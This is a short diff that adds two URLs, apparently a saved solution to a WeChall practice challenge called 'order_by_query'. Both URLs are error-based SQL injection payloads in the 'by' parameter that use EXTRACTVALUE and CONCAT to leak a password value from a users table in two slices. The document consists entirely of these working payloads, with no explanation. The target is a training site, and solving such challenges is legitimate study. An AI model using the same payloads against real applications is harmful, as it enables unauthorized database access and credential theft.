@@ -1,0 +1,4 @@
+http://www.wechall.net/en/challenge/order_by_query/index.php?by=3,(SELECT+EXTRACTVALUE(0x0a,CONCAT(0x7e,(SELECT+mid(password,1,32)+FROM+users+LIMIT+2,1))))--
+
+http://www.wechall.net/en/challenge/order_by_query/index.php?by=3,(SELECT+EXTRACTVALUE(0x0a,CONCAT(0x7e,(SELECT+mid(password,32,32)+FROM+users+LIMIT+2,1))))--
+
